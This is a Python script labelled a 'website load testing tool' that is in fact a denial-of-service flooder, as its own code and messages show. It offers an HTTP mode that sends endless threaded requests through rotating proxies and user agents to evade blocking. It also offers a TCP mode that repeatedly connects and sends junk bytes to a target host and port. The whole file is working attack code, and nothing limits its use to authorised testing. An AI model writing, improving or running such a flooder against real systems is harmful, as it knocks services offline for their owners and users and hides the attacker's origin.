import argparse
import random
import threading
import requests
import socket
import os
import time
from tqdm import tqdm
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import signal
import sys

# Global counters
success_count = 0
failure_count = 0
exit_flag = False

def signal_handler(sig, frame):
    global exit_flag
    exit_flag = True
    print("\033[31m[INFO] Exiting... Gracefully shutting down.\033[0m")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def analyze_response(response):
    global success_count, failure_count
    if response.status_code == 403:
        print("\033[31m[FORBIDDEN]\033[0m", response.url)
        failure_count += 1
    elif response.status_code == 200:
        print("\033[32m[OK]\033[0m", response.url)
        success_count += 1
    elif response.status_code == 404:
        print("\033[33m[NOT FOUND]\033[0m", response.url)
        failure_count += 1
    else:
        print(f"\033[35m[UNKNOWN] {response.url} ({response.status_code})\033[0m")
        failure_count += 1

def perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry):  # Fix: Changed proxy_file to proxy_list
    session = requests.Session()
    retry_strategy = Retry(total=retry, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    def flood():
        global success_count, failure_count, exit_flag
        while not exit_flag:
            try:
                headers = {"User-Agent": random.choice(user_agents)}
                proxy = random.choice(proxy_list) if proxy_list else None  # Fix: Using proxy_list instead of undefined variable
                proxies = {"http": proxy, "https": proxy} if proxy else None
                response = session.get(f"http://{target}:{port}", headers=headers, proxies=proxies, timeout=10)
                analyze_response(response)
            except requests.exceptions.RequestException:
                print("\033[31m[ERROR] Connection timed out\033[0m")
                failure_count += 1

    threads_list = []
    print("\033[34m[INFO] Starting HTTP flood attack...\033[0m")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        threads_list.append(t)
        t.start()

    for t in tqdm(threads_list, desc="Progress", colour="blue"):
        t.join()

    print(f"\033[36m[RESULT] Successful requests: {success_count}, Failed requests: {failure_count}\033[0m")


def perform_tcp_flood(target, port, threads, timeout):
    def flood():
        global success_count, failure_count, exit_flag
        while not exit_flag:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(60)  # Timeout set to 60 seconds
                s.connect((target, port))
                s.send(b"\x00" * 1024)
                s.close()
                success_count += 1
                print("\033[32m[SENT]\033[0m Packet sent successfully!")
            except socket.error:
                failure_count += 1
                print("\033[31m[FAILED]\033[0m Packet sent failed!")

    threads_list = []
    print("\033[34m[INFO] Starting TCP flood attack...\033[0m")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        threads_list.append(t)
        t.start()

    for t in tqdm(threads_list, desc="Progress", colour="red"):
        t.join()

    print(f"\033[36m[RESULT] Successful packets: {success_count}, Failed packets: {failure_count}\033[0m")

def main():
    parser = argparse.ArgumentParser(description="Advanced Website Load Testing Tool")
    parser.add_argument("-url", "--target", help="Target IP address or domain", required=True)
    parser.add_argument("-port", "--port", help="Target port", required=True, type=int)
    parser.add_argument("-method", "--mode", help="Attack mode (http or tcp)", required=True, choices=["http", "tcp"])
    parser.add_argument("-threads", "--threads", help="Number of threads", type=int, default=10)
    parser.add_argument("-proxy", "--proxy", help="Path to proxy file")
    parser.add_argument("-useragents", "--user-agents", help="Path to user agents file", default="user-agents.txt")
    parser.add_argument("-retry", "--retry", help="Number of retries", type=int, default=3)
    parser.add_argument("-time", "--timeout", help="Request timeout in seconds", type=int, default=5)

    # Parse the arguments
    args = parser.parse_args()
    
    # Extract arguments from parsed data
    target = args.target
    port = args.port
    mode = args.mode  # Ensure this is assigned properly
    threads = args.threads
    proxy_file = args.proxy
    user_agents_path = args.user_agents
    retry = args.retry
    timeout = args.timeout

    # Check if 'mode' was correctly set
    print(f"Mode: {mode}")  # Debugging line to see if 'mode' is set correctly

    # Ensure user agents file exists
    if not os.path.exists(user_agents_path):
        print(f"\033[31m[ERROR] User agent file {user_agents_path} not found.\033[0m")
        return

    # Read user agents from file
    with open(user_agents_path, "r") as file:
        user_agents = file.read().splitlines()

    # Read proxy list from file if provided
    proxy_list = []
    if proxy_file:
        if not os.path.exists(proxy_file):
            print(f"\033[31m[ERROR] Proxy file {proxy_file} not found.\033[0m")
            return
        with open(proxy_file, "r") as file:
            proxy_list = file.read().splitlines()

    # Run the appropriate flood method based on 'mode'
    if mode == "http":
        perform_http_flood(target, port, threads, proxy_list, user_agents, timeout, retry)
    elif mode == "tcp":
        perform_tcp_flood(target, port, threads, timeout)

if __name__ == "__main__":
    main()
